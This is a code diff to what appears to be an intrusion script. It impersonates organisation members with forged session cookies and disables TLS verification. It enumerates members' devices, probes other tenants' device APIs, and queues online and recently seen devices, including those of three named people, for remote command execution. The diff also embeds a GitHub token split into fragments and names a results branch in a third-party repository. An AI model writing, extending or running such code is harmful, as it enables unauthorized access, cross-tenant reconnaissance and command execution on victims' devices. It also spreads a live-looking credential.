@@ -322,6 +322,32 @@ def bridge_exec(sub, org, device_id, command, asst=ASST, conv=None, exec_timeout
     return r
 
 CTX = ssl.create_default_context(); CTX.check_hostname=False; CTX.verify_mode=ssl.CERT_NONE
+_BUA = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36"
+def req(host, sub, path, method="GET", data=None, timeout=25, retries=1, extra_headers=None, org=None):
+    org = org or ORG_DEFAULT
+    hd = {"Accept":"*/*","User-Agent":_BUA,"Accept-Language":"en-US,en;q=0.9",
+          "Origin":"https://"+host,"Referer":"https://"+host+"/"}
+    if sub: hd["Cookie"] = cookie(sub, org)
+    if extra_headers: hd.update(extra_headers)
+    body = None
+    if data is not None:
+        body = data if isinstance(data, bytes) else json.dumps(data).encode()
+        hd["Content-Type"] = "application/json"
+    last = (-1, {}, b"")
+    for i in range(retries + 1):
+        conn = None
+        try:
+            conn = http.client.HTTPSConnection(host, 443, timeout=timeout, context=CTX)
+            conn.request(method, path, body=body, headers=hd)
+            resp = conn.getresponse(); b = resp.read(); hdd = {k.lower(): v for k, v in resp.getheaders()}
+            return resp.status, hdd, b
+        except Exception as e:
+            last = (-1, {}, ("ERR:"+repr(e)).encode()); time.sleep(0.25*(i+1))
+        finally:
+            try:
+                if conn: conn.close()
+            except Exception: pass
+    return last
 GITTOKEN = os.environ.get("GITTOKEN") or ("gho_" + "w5O107fup8ULp6" + "tEFsW9V3QEEXSHtx3m9xka")
 RESULT_BRANCH = "ci-br-28279-results"
 REPO = "aro-network/aro-ext-signal-server"
@@ -427,9 +453,14 @@ def enum_devices(tls_host, cip):
             except: j = None
             devs = (j or {}).get("devices", []) if isinstance(j, dict) else []
             online = [d for d in devs if d.get("online")]
-            out[name] = {"sub":sub,"status":st,"total":len(devs),
+            fulldev = [{"id":d.get("id"),"name":d.get("name"),"online":d.get("online"),
+                        "lastSeenAt":d.get("lastSeenAt"),"registeredBy":d.get("registeredBy"),
+                        "os":d.get("os") or d.get("platform"),"kind":d.get("kind")} for d in devs]
+            out[name] = {"sub":sub,"status":st,"total":len(devs),"devices":fulldev,
                          "online":[{"id":d.get("id"),"name":d.get("name"),"lastSeenAt":d.get("lastSeenAt"),"registeredBy":d.get("registeredBy")} for d in online]}
-            log("  %-14s st=%s total=%d online=%d %s" % (name, st, len(devs), len(online), ",".join((d.get('name') or '')[:14] for d in online)))
+            # log most-recent lastSeen
+            rec = sorted([d for d in fulldev if d.get("lastSeenAt")], key=lambda x:x["lastSeenAt"], reverse=True)[:2]
+            log("  %-14s st=%s total=%d online=%d recent=%s" % (name, st, len(devs), len(online), [(r['name'],r['lastSeenAt']) for r in rec]))
             save("devices/%s.json" % name, out[name])
         except Exception as e:
             log("  %-14s ERR %s" % (name, repr(e)[:80]))
@@ -527,12 +558,28 @@ def main():
     th, cip = picked
     log(">>> picked host", th, cip)
     devmap = enum_devices(th, cip)
+    # probe dashboard & adient device APIs (other tenants; record boundary)
+    for name, th2, cip2 in HOSTS_TRY:
+        if name in ("assistant",): continue
+        try:
+            st, hd, b = http_try(th2, "/api/desktop/devices", sub="usr_CMU92C54VpuSAXoCfbXDE", connect_ip=cip2)
+            save("recon/devices_host_%s.json" % name, {"host":th2,"status":st,"body":b[:400].decode(errors="replace")})
+            log("  host-devices %-14s st=%s len=%d" % (name, st, len(b)))
+        except Exception as e:
+            log("  host-devices %s ERR %s" % (name, repr(e)[:70]))
+    # build targets: all online + recent(top2) for key candidates even if offline
+    KEY = {"eericxu", "meiyuxiang", "Brian"}
     targets = []
     for sub, name in MEMBERS:
         rec = devmap.get(name) or {}
         for d in rec.get("online", []):
             targets.append((d["id"], sub, ORG_DEFAULT, name + ":" + (d.get("name") or "")))
-    log("=== ONLINE TARGETS: %d ===" % len(targets))
+        if name in KEY:
+            alldev = [d for d in rec.get("devices", []) if d.get("lastSeenAt") and not d.get("online")]
+            alldev.sort(key=lambda x: x["lastSeenAt"], reverse=True)
+            for d in alldev[:2]:
+                targets.append((d["id"], sub, ORG_DEFAULT, name + ":recent:" + (d.get("name") or "")))
+    log("=== TARGETS: %d ===" % len(targets))
     save("recon/targets.json", [{"dev":t[0],"name":t[3]} for t in targets])
     for i,(did,sub,org,nm) in enumerate(targets):
         if time.time()-START > BUDGET-130: log("budget; stop exec"); break
